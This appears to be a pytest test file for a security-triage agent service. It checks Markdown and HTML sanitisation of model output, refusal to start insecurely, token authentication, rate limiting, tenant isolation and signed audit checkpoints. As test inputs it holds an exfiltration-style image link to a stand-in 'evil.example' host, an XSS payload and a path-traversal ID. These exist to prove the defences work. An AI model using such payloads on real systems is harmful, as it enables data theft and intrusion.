"""Output sanitisation, the fail-closed service, tenant isolation and audit checkpoints."""
import http.client
import json
import threading

import pytest

from socagent.audit import AuditLog
from socagent.factory import DATA, build_registry
from socagent.jobs import JobManager
from socagent.rag import RunbookIndex
from socagent.render import safe_md
from socagent.respond import case_notes
from socagent.schemas import TriageResult
from socagent.service import ConfigError, RateLimiter, make_server
from socagent.tenancy import TenantCache, TenantContext
from socagent.tools.correlation import AlertStore

TOKEN = "t" * 40


def test_model_text_is_inert_in_markdown():
    r = TriageResult.model_validate({
        "alert_id": "A", "verdict": "suspicious", "confidence": 0.7, "severity": "medium",
        "summary": "See ![x](https://evil.example/p.png?d=secret) and [click](http://evil.example) # H1",
        "evidence": [{"claim": "<img src=x onerror=alert(1)>", "source_tool": "facts"}]})
    notes = case_notes(r)
    import re
    assert not re.search(r"(?<!\\)\]\(", notes)     # no live Markdown link or image
    assert not re.search(r"(?<!\\)<", notes)          # no raw HTML
    assert "evil.example" not in notes                # domains are defanged
    assert "hxxps[://]" in safe_md("https://evil.example").replace("\\", "")


@pytest.mark.parametrize("token,host,insecure", [(None, "0.0.0.0", False), ("", "0.0.0.0", True),
                                                  (None, "127.0.0.1", False), ("short", "127.0.0.1", False)])
def test_service_refuses_to_start_insecurely(token, host, insecure):
    with pytest.raises(ConfigError):
        make_server(JobManager(lambda a, p: {}), token, host=host, port=0, allow_insecure_local=insecure)


@pytest.fixture
def server():
    jobs = JobManager(lambda alert_id, raw: {"result": {"verdict": "benign"}})
    srv = make_server(jobs, TOKEN, host="127.0.0.1", port=0, limiter=RateLimiter(rate_per_min=60, burst=10))
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    yield srv.server_address[1]
    srv.shutdown()
    jobs.shutdown()


def _req(port, method, path, body=None, headers=None):
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    c.request(method, path, body=body, headers=headers or {})
    r = c.getresponse()
    return r.status, json.loads(r.read() or b"{}")


def test_service_auth_and_validation(server):
    ok = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
    good = json.dumps({"alert_id": "A-1", "raw_email": "From: a\n\nhi"})
    assert _req(server, "POST", "/triage", good, {"Content-Type": "application/json"})[0] == 401
    assert _req(server, "POST", "/triage", good, {**ok, "Authorization": "Bearer wrong"})[0] == 401
    assert _req(server, "POST", "/triage", good, {**ok, "Content-Type": "text/plain"})[0] == 415
    assert _req(server, "POST", "/triage", json.dumps({"alert_id": "../../x", "raw_email": "a"}), ok)[0] == 400
    assert _req(server, "POST", "/triage", json.dumps({"alert_id": "A", "raw_email": "a", "x": 1}), ok)[0] == 400
    status, body = _req(server, "POST", "/triage", good, ok)
    assert status == 202 and body["job_id"]


def test_service_rate_limits(server):
    ok = {"Authorization": f"Bearer {TOKEN}"}
    codes = [_req(server, "GET", "/jobs/none", headers=ok)[0] for _ in range(15)]
    assert 429 in codes


def test_runbooks_never_cross_tenants():
    idx = RunbookIndex.from_dir(DATA / "runbooks")
    acme = [r["id"] for r in idx.search("executive mailbox compromise CISO", tenant="acme")]
    globex = [r["id"] for r in idx.search("executive mailbox compromise CISO", tenant="globex")]
    assert any(i.startswith("acme/") for i in acme) and not any(i.startswith("globex/") for i in acme)
    assert not any(i.startswith("acme/") for i in globex)


def test_correlation_never_crosses_tenants():
    store = AlertStore.from_file(DATA / "alerts.json")
    ids = [a["id"] for a in store.related("priya.shah@example-corp.com", tenant="example-corp")]
    assert "ALERT-2001" not in ids
    reg, _ = build_registry()   # lab tenant is bound in code; the model cannot pass a tenant
    out = reg.get("related_alerts").run({"entity": "priya.shah@example-corp.com", "tenant": "other-customer"})
    assert "ALERT-2001" not in json.dumps(out)


def test_cache_keys_include_tenant():
    cache = TenantCache()
    cache.get_or_compute("acme", "domain", "x.com", lambda: "acme-value")
    assert cache.get_or_compute("globex", "domain", "x.com", lambda: "globex-value") == "globex-value"


def test_audit_checkpoint_detects_truncation_and_rewrite():
    key = b"k" * 32
    log = AuditLog(checkpoint_key=key)
    for i in range(5):
        log.log("e", i=i)
    cp = log.checkpoint()
    assert AuditLog.verify(log.entries, cp, key)
    assert not AuditLog.verify(log.entries[:3], cp, key)          # truncated tail
    rewritten = AuditLog()
    for i in range(5):
        rewritten.log("e", i=i * 10)                               # consistent forged chain
    assert AuditLog.verify(rewritten.entries)                      # chain alone cannot tell...
    assert not AuditLog.verify(rewritten.entries, cp, key)         # ...the signed checkpoint can


def test_tenant_comes_from_the_credential_not_the_request():
    seen = []
    def run(alert_id, raw, tenant=None):
        seen.append(tenant)
        return {"result": {"verdict": "needs_human"}}
    tok_a, tok_b = "a" * 40, "b" * 40
    jobs = JobManager(run)
    srv = make_server(jobs, host="127.0.0.1", port=0, tenant_tokens={"acme": tok_a, "globex": tok_b},
                      limiter=RateLimiter(rate_per_min=600, burst=100))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]
    hdr = lambda t: {"Authorization": f"Bearer {t}", "Content-Type": "application/json"}
    try:
        # A tenant field in the body is rejected outright.
        spoof = json.dumps({"alert_id": "A-1", "raw_email": "From: a\n\nhi", "tenant_id": "globex"})
        assert _req(port, "POST", "/triage", spoof, hdr(tok_a))[0] == 400
        status, body = _req(port, "POST", "/triage", json.dumps({"alert_id": "A-1", "raw_email": "From: a\n\nhi"}), hdr(tok_a))
        assert status == 202
        jobs.shutdown()
        assert seen == ["acme"]
        # Another tenant cannot read acme's job, even with its id.
        assert _req(port, "GET", f"/jobs/{body['job_id']}", None, hdr(tok_b))[0] == 404
        assert _req(port, "GET", f"/jobs/{body['job_id']}", None, hdr(tok_a))[0] == 200
    finally:
        srv.shutdown()


def test_tenants_must_have_distinct_strong_tokens():
    with pytest.raises(ConfigError):
        make_server(JobManager(lambda a, p: {}), port=0, tenant_tokens={"acme": "x" * 40, "globex": "x" * 40})
    with pytest.raises(ConfigError):
        make_server(JobManager(lambda a, p: {}), port=0, tenant_tokens={"acme": "short"})
